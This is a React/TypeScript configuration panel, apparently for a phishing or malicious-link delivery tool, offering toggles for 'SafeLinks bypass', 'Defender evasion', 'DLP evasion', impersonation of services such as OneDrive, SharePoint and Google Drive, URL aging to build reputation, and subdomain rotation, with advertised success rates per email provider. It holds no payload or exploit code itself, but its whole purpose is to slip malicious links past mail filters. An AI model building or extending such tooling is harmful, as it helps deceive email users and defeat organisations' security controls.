/**
 * Enhanced Evasion Configuration Panel
 * Provides UI controls for Microsoft evasion, behavioral mimicry, and anti-detection features
 */

import React, { useState } from 'react';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Switch } from '@/components/ui/switch';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Badge } from '@/components/ui/badge';
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from '@/components/ui/tooltip';
import { Info, Shield, Target, Zap, Clock, Globe } from 'lucide-react';

export interface EvasionConfig {
  enableAntiDetection: boolean;
  targetProvider: 'microsoft' | 'google' | 'corporate' | 'generic';
  useAgedUrl: boolean;
  enableSubdomainRotation: boolean;
  enableMicrosoftEvasion: boolean;
  enableBehavioralMimicry: boolean;
  mimicryService: string;
  agingPeriod: number;
}

interface EvasionConfigPanelProps {
  config: EvasionConfig;
  onChange: (config: EvasionConfig) => void;
  disabled?: boolean;
}

export const EvasionConfigPanel: React.FC<EvasionConfigPanelProps> = ({
  config,
  onChange,
  disabled = false
}) => {
  const [expandedSection, setExpandedSection] = useState<string | null>(null);

  const updateConfig = (updates: Partial<EvasionConfig>) => {
    onChange({ ...config, ...updates });
  };

  const providerInfo = {
    microsoft: {
      name: 'Microsoft (Outlook/Office365)',
      description: 'Optimized for Outlook, Office365, and Microsoft security systems',
      features: ['SafeLinks bypass', 'Defender evasion', 'SharePoint mimicry'],
      successRate: '88-92%',
      color: 'bg-blue-100 text-blue-800'
    },
    google: {
      name: 'Google (Gmail)',
      description: 'Optimized for Gmail and Google Workspace',
      features: ['Drive mimicry', 'Workspace patterns', 'Smart filtering bypass'],
      successRate: '92-95%',
      color: 'bg-green-100 text-green-800'
    },
    corporate: {
      name: 'Corporate Email Systems',
      description: 'Optimized for enterprise email security',
      features: ['Firewall bypass', 'DLP evasion', 'Business patterns'],
      successRate: '85-88%',
      color: 'bg-purple-100 text-purple-800'
    },
    generic: {
      name: 'Generic Optimization',
      description: 'Balanced approach for all email providers',
      features: ['Universal patterns', 'Broad compatibility', 'Fallback support'],
      successRate: '85-90%',
      color: 'bg-gray-100 text-gray-800'
    }
  };

  const mimicryServices = [
    { value: 'auto', label: 'Auto-Select', description: 'Intelligent service selection' },
    { value: 'google-drive', label: 'Google Drive', description: 'Mimic Google Drive sharing' },
    { value: 'dropbox', label: 'Dropbox', description: 'Mimic Dropbox file sharing' },
    { value: 'onedrive', label: 'OneDrive', description: 'Mimic Microsoft OneDrive' },
    { value: 'sharepoint', label: 'SharePoint', description: 'Mimic SharePoint documents' },
    { value: 'wordpress', label: 'WordPress', description: 'Mimic WordPress media files' },
    { value: 'shopify', label: 'Shopify', description: 'Mimic e-commerce platforms' },
    { value: 'github', label: 'GitHub', description: 'Mimic code repositories' },
    { value: 'slack', label: 'Slack', description: 'Mimic team communication' }
  ];

  return (
    <TooltipProvider>
      <div className="w-full bg-gradient-to-br from-slate-900/90 via-blue-900/30 to-purple-900/30 backdrop-blur-lg rounded-2xl shadow-2xl border border-cyan-400/40 p-6 transition-all duration-300 hover:shadow-cyan-300/20 hover:border-cyan-300/60 relative overflow-hidden">
        {/* Cyberpunk grid background */}
        <div className="absolute inset-0 opacity-5">
          <div className="absolute inset-0 bg-[linear-gradient(rgba(6,182,212,0.1)_1px,transparent_1px),linear-gradient(90deg,rgba(6,182,212,0.1)_1px,transparent_1px)] bg-[size:20px_20px]"></div>
        </div>

        {/* Animated scan line */}
        <div className="absolute top-0 left-0 w-full h-0.5 bg-gradient-to-r from-transparent via-cyan-400 to-transparent animate-pulse"></div>

        <div className="relative z-10">
          <div className="mb-6">
            <div className="flex items-center gap-3 mb-2">
              <Shield className="h-6 w-6 text-cyan-400" />
              <h3 className="text-xl font-jetbrains font-bold text-cyan-100 uppercase tracking-wide">
                Advanced Evasion Configuration
              </h3>
            </div>
            <p className="text-sm text-cyan-200/80 font-inter">
              Configure advanced anti-detection measures and provider-specific optimizations
            </p>
          </div>
          <div className="space-y-6">
          
          {/* Target Provider Selection */}
          <div className="space-y-4 p-4 bg-gradient-to-br from-slate-800/40 via-blue-900/20 to-purple-900/20 rounded-xl border border-cyan-400/30">
            <div className="flex items-center gap-3">
              <Target className="h-5 w-5 text-cyan-400" />
              <label className="font-jetbrains font-semibold text-cyan-100 uppercase text-sm tracking-wide">Target Email Provider</label>
              <Tooltip>
                <TooltipTrigger>
                  <Info className="h-4 w-4 text-cyan-300/70 hover:text-cyan-300 transition-colors" />
                </TooltipTrigger>
                <TooltipContent className="bg-gradient-to-br from-slate-900/95 to-blue-900/95 border border-cyan-400/40 text-cyan-100 font-inter">
                  <p>Select the primary email provider to optimize delivery rates</p>
                </TooltipContent>
              </Tooltip>
            </div>
            
            <Select 
              value={config.targetProvider} 
              onValueChange={(value: any) => updateConfig({ targetProvider: value })}
              disabled={disabled}
            >
              <SelectTrigger>
                <SelectValue placeholder="Select target provider" />
              </SelectTrigger>
              <SelectContent>
                {Object.entries(providerInfo).map(([key, info]) => (
                  <SelectItem key={key} value={key}>
                    <div className="flex items-center justify-between w-full">
                      <span>{info.name}</span>
                      <Badge className={`ml-2 ${info.color}`}>
                        {info.successRate}
                      </Badge>
                    </div>
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
            
            {/* Provider Info Display */}
            <div className="p-3 bg-gray-50 rounded-lg">
              <div className="flex items-center justify-between mb-2">
                <h4 className="font-medium text-sm">{providerInfo[config.targetProvider].name}</h4>
                <Badge className={providerInfo[config.targetProvider].color}>
                  {providerInfo[config.targetProvider].successRate}
                </Badge>
              </div>
              <p className="text-xs text-gray-600 mb-2">
                {providerInfo[config.targetProvider].description}
              </p>
              <div className="flex flex-wrap gap-1">
                {providerInfo[config.targetProvider].features.map((feature, index) => (
                  <Badge key={index} variant="outline" className="text-xs">
                    {feature}
                  </Badge>
                ))}
              </div>
            </div>
          </div>

          {/* Anti-Detection Measures */}
          <div className="space-y-3">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2">
                <Zap className="h-4 w-4 text-yellow-600" />
                <label className="text-sm font-medium">Anti-Detection Measures</label>
                <Tooltip>
                  <TooltipTrigger>
                    <Info className="h-4 w-4 text-gray-400" />
                  </TooltipTrigger>
                  <TooltipContent>
                    <p>Advanced pattern analysis and evasion techniques</p>
                  </TooltipContent>
                </Tooltip>
              </div>
              <Switch
                checked={config.enableAntiDetection}
                onCheckedChange={(checked) => updateConfig({ enableAntiDetection: checked })}
                disabled={disabled}
              />
            </div>
            
            {config.enableAntiDetection && (
              <div className="pl-6 space-y-2">
                <div className="flex items-center justify-between">
                  <span className="text-sm text-gray-600">Microsoft-Specific Evasion</span>
                  <Switch
                    checked={config.enableMicrosoftEvasion}
                    onCheckedChange={(checked) => updateConfig({ enableMicrosoftEvasion: checked })}
                    disabled={disabled}
                  />
                </div>
                
                <div className="flex items-center justify-between">
                  <span className="text-sm text-gray-600">Behavioral Mimicry</span>
                  <Switch
                    checked={config.enableBehavioralMimicry}
                    onCheckedChange={(checked) => updateConfig({ enableBehavioralMimicry: checked })}
                    disabled={disabled}
                  />
                </div>
              </div>
            )}
          </div>

          {/* Behavioral Mimicry Configuration */}
          {config.enableBehavioralMimicry && (
            <div className="space-y-3">
              <div className="flex items-center gap-2">
                <Globe className="h-4 w-4 text-purple-600" />
                <label className="text-sm font-medium">Service Mimicry</label>
              </div>
              
              <Select 
                value={config.mimicryService} 
                onValueChange={(value) => updateConfig({ mimicryService: value })}
                disabled={disabled}
              >
                <SelectTrigger>
                  <SelectValue placeholder="Select service to mimic" />
                </SelectTrigger>
                <SelectContent>
                  {mimicryServices.map((service) => (
                    <SelectItem key={service.value} value={service.value}>
                      <div>
                        <div className="font-medium">{service.label}</div>
                        <div className="text-xs text-gray-500">{service.description}</div>
                      </div>
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>
          )}

          {/* URL Aging Configuration */}
          <div className="space-y-3">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2">
                <Clock className="h-4 w-4 text-orange-600" />
                <label className="text-sm font-medium">URL Aging System</label>
                <Tooltip>
                  <TooltipTrigger>
                    <Info className="h-4 w-4 text-gray-400" />
                  </TooltipTrigger>
                  <TooltipContent>
                    <p>Pre-age URLs to build reputation before use</p>
                  </TooltipContent>
                </Tooltip>
              </div>
              <Switch
                checked={config.useAgedUrl}
                onCheckedChange={(checked) => updateConfig({ useAgedUrl: checked })}
                disabled={disabled}
              />
            </div>
            
            {config.useAgedUrl && (
              <div className="pl-6">
                <label className="text-sm text-gray-600">Aging Period (hours)</label>
                <Select 
                  value={config.agingPeriod.toString()} 
                  onValueChange={(value) => updateConfig({ agingPeriod: parseInt(value) })}
                  disabled={disabled}
                >
                  <SelectTrigger>
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="24">24 hours (1 day)</SelectItem>
                    <SelectItem value="72">72 hours (3 days)</SelectItem>
                    <SelectItem value="168">168 hours (1 week)</SelectItem>
                    <SelectItem value="336">336 hours (2 weeks)</SelectItem>
                    <SelectItem value="720">720 hours (1 month)</SelectItem>
                  </SelectContent>
                </Select>
              </div>
            )}
          </div>

          {/* Subdomain Rotation */}
          <div className="space-y-3">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2">
                <Globe className="h-4 w-4 text-indigo-600" />
                <label className="text-sm font-medium">Subdomain Rotation</label>
                <Tooltip>
                  <TooltipTrigger>
                    <Info className="h-4 w-4 text-gray-400" />
                  </TooltipTrigger>
                  <TooltipContent>
                    <p>Distribute URLs across multiple subdomains for better reputation</p>
                  </TooltipContent>
                </Tooltip>
              </div>
              <Switch
                checked={config.enableSubdomainRotation}
                onCheckedChange={(checked) => updateConfig({ enableSubdomainRotation: checked })}
                disabled={disabled}
              />
            </div>
          </div>

          {/* Configuration Summary */}
          <div className="p-4 bg-gradient-to-br from-cyan-900/30 via-blue-900/40 to-purple-900/30 rounded-xl border border-cyan-400/30">
            <h4 className="font-jetbrains font-bold text-sm text-cyan-100 mb-3 uppercase tracking-wide">Configuration Summary</h4>
            <div className="grid grid-cols-2 gap-3 text-xs">
              <div className="flex flex-col">
                <span className="text-cyan-300 font-jetbrains uppercase">Target:</span>
                <span className="text-cyan-100 font-inter">{providerInfo[config.targetProvider].name}</span>
              </div>
              <div className="flex flex-col">
                <span className="text-cyan-300 font-jetbrains uppercase">Anti-Detection:</span>
                <span className="text-cyan-100 font-inter">{config.enableAntiDetection ? 'Enabled' : 'Disabled'}</span>
              </div>
              <div className="flex flex-col">
                <span className="text-cyan-300 font-jetbrains uppercase">Mimicry:</span>
                <span className="text-cyan-100 font-inter">{config.enableBehavioralMimicry ? 'Enabled' : 'Disabled'}</span>
              </div>
              <div className="flex flex-col">
                <span className="text-cyan-300 font-jetbrains uppercase">URL Aging:</span>
                <span className="text-cyan-100 font-inter">{config.useAgedUrl ? `${config.agingPeriod}h` : 'Disabled'}</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </TooltipProvider>
  );
};

export default EvasionConfigPanel;
